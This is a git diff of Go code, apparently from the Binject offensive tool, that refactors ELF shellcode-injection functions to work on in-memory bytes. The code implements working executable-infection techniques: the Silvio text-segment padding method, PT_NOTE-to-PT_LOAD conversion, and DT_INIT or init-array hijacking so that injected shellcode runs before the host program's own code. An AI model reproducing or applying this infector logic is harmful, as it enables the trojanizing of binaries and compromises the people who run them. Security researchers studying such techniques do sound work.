@@ -1,11 +1,9 @@
 package bj
 
 import (
+	"bytes"
 	"errors"
-	"fmt"
-	"io/ioutil"
 	"log"
-	"os"
 	"sort"
 
 	"github.com/Binject/debug/elf"
@@ -13,24 +11,11 @@ import (
 )
 
 // ElfBinject - Inject shellcode into an ELF binary
-func ElfBinject(sourceFile string, destFile string, shellcodeFile string, config *BinjectConfig) error {
+func ElfBinject(sourceBytes []byte, shellcodeBytes []byte, config *BinjectConfig) ([]byte, error) {
 
-	userShellCode, err := ioutil.ReadFile(shellcodeFile)
+	elfFile, err := elf.NewFile(bytes.NewReader(sourceBytes))
 	if err != nil {
-		return err
-	}
-
-	fileinfo, err := os.Stat(sourceFile)
-	filesize := fileinfo.Size()
-	fmt.Println("Size of source file:", fileinfo.Size())
-	fmt.Println("file size:", filesize)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	elfFile, err := elf.Open(sourceFile)
-	if err != nil {
-		return err
+		return nil, err
 	}
 
 	//
@@ -39,9 +24,9 @@ func ElfBinject(sourceFile string, destFile string, shellcodeFile string, config
 
 	if config.CodeCaveMode == true {
 		log.Printf("Using Code Cave Method")
-		caves, err := FindCaves(sourceFile)
+		caves, err := FindCaves(sourceBytes)
 		if err != nil {
-			return err
+			return nil, err
 		}
 		for _, cave := range caves {
 			for _, section := range elfFile.Sections {
@@ -59,16 +44,16 @@ func ElfBinject(sourceFile string, destFile string, shellcodeFile string, config
 	if elfFile.FileHeader.Type == elf.ET_EXEC || // for non-PIE executables
 		elfFile.SectionByName(".interp") != nil { // for PIE executables, todo: libc.so.6 has an .interp section?
 		if config.InjectionMethod == SilvioInject {
-			return staticSilvioMethod(elfFile, destFile, userShellCode)
+			return staticSilvioMethod(elfFile, shellcodeBytes)
 		} else {
-			return NoteToLoad(elfFile, destFile, userShellCode, filesize)
+			return NoteToLoad(elfFile, shellcodeBytes, int64(len(sourceBytes)))
 		}
 	} else {
-		return dynamicMethod(elfFile, destFile, userShellCode)
+		return dynamicMethod(elfFile, shellcodeBytes)
 	}
 }
 
-func staticSilvioMethod(elfFile *elf.File, destFile string, userShellCode []byte) error {
+func staticSilvioMethod(elfFile *elf.File, userShellCode []byte) ([]byte, error) {
 	/*
 			  Circa 1998: http://vxheavens.com/lib/vsc01.html  <--Thanks to elfmaster
 		        6. Increase p_shoff by PAGE_SIZE in the ELF header
@@ -148,14 +133,13 @@ func staticSilvioMethod(elfFile *elf.File, destFile string, userShellCode []byte
 	//	into the file - text segment p_offset + p_filesz (original)
 	elfFile.Insertion = shellcode
 
-	return elfFile.WriteFile(destFile)
+	return elfFile.Bytes()
 }
 
-// PT_NOTE to PT_LOAD infection method
+// NoteToLoad - PT_NOTE to PT_LOAD infection method
 // ***********************************
 // ***********************************
-
-func NoteToLoad(elfFile *elf.File, destFile string, userShellCode []byte, fsize int64) error {
+func NoteToLoad(elfFile *elf.File, userShellCode []byte, fsize int64) ([]byte, error) {
 
 	injectSize := uint64(0)
 	shellcode := []byte{}
@@ -208,10 +192,10 @@ func NoteToLoad(elfFile *elf.File, destFile string, userShellCode []byte, fsize 
 
 	elfFile.InsertionEOF = shellcode
 
-	return elfFile.WriteFile(destFile)
+	return elfFile.Bytes()
 }
 
-func dynamicMethod(elfFile *elf.File, destFile string, userShellCode []byte) error {
+func dynamicMethod(elfFile *elf.File, userShellCode []byte) ([]byte, error) {
 	// from positron/elfhack:
 	// The injected code needs to be executed before any init code in the
 	// binary. There are three possible cases:
@@ -283,7 +267,7 @@ func dynamicMethod(elfFile *elf.File, destFile string, userShellCode []byte) err
 	//   DT_INIT entry pointing to the injected code.
 	if initCnt == 0 && arrayCnt == 0 {
 		if nullIdx < 0 {
-			return errors.New("No init in a DYN and no free slots means an invalid source binary")
+			return nil, errors.New("No init in a DYN and no free slots means an invalid source binary")
 		}
 		elfFile.DynTags[nullIdx] = elf.DynTagValue{Tag: elf.DT_INIT, Value: scAddr}
 	} else if initCnt > 0 {
@@ -300,5 +284,5 @@ func dynamicMethod(elfFile *elf.File, destFile string, userShellCode []byte) err
 
 	elfFile.Insertion = userShellCode
 
-	return elfFile.WriteFile(destFile)
+	return elfFile.Bytes()
 }
